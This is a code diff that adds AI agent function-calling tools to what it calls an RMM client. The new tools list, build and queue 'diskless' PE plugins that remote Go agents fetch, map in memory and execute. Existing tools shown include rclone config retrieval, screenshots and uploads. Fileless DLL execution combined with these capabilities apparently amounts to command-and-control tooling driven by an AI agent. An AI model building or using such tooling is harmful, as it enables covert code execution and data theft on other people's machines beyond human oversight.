@@ -221,6 +221,30 @@ def tool_queue_screenshot(client: RmmApiClient, session_ref: str) -> str:
     return _json_result({"ok": code == 200, "status": code, "data": data})
 
 
+def tool_list_plugins(client: RmmApiClient) -> str:
+    code, data = client.list_plugins()
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
+def tool_queue_pe_load(
+    client: RmmApiClient,
+    session_ref: str,
+    plugin: str,
+    export: str = "Run",
+    plugin_input: str = "",
+) -> str:
+    sid, _ = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, "error": "session_not_found"})
+    code, data = client.queue_pe_load(sid, plugin, export=export, plugin_input=plugin_input)
+    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})
+
+
+def tool_build_plugin(client: RmmApiClient, name: str, output: str = "") -> str:
+    code, data = client.build_plugin(name, output or None)
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
 def tool_queue_upload(
     client: RmmApiClient,
     session_ref: str,
@@ -441,6 +465,15 @@ TOOL_HANDLERS = {
     ),
     "get_rclone_config": lambda c, a: tool_get_rclone_config(c),
     "queue_screenshot": lambda c, a: tool_queue_screenshot(c, a["session_ref"]),
+    "list_plugins": lambda c, a: tool_list_plugins(c),
+    "queue_pe_load": lambda c, a: tool_queue_pe_load(
+        c,
+        a["session_ref"],
+        a["plugin"],
+        a.get("export", "Run"),
+        a.get("input", ""),
+    ),
+    "build_plugin": lambda c, a: tool_build_plugin(c, a["plugin_name"], a.get("output", "")),
     "queue_upload": lambda c, a: tool_queue_upload(
         c, a["session_ref"], a["local_path"], a["remote_path"]
     ),
@@ -646,6 +679,52 @@ OPENAI_TOOLS: list[dict] = [
                 "type": "object",
                 "properties": {"session_ref": {"type": "string"}},
                 "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "list_plugins",
+            "description": "List PE plugins available on the RMM server for the Go agent.",
+            "parameters": {"type": "object", "properties": {}},
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "queue_pe_load",
+            "description": (
+                "Queue a diskless PE plugin load on the Go agent: the plugin is "
+                "fetched from the server, mapped in memory, and the export is called."
+            ),
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "plugin": {"type": "string"},
+                    "export": {"type": "string", "description": "Plugin export name (default Run)"},
+                    "input": {"type": "string", "description": "Optional input passed to the export"},
+                },
+                "required": ["session_ref", "plugin"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "build_plugin",
+            "description": (
+                "Cross-compile a checked-in Go PE plugin on the RMM server; the "
+                "built DLL is served to Go agents from the server plugin directory."
+            ),
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "plugin_name": {"type": "string", "description": "Checked-in plugin target"},
+                    "output": {"type": "string", "description": "Output DLL name (default <plugin>.dll)"},
+                },
+                "required": ["plugin_name"],
             },
         },
     },
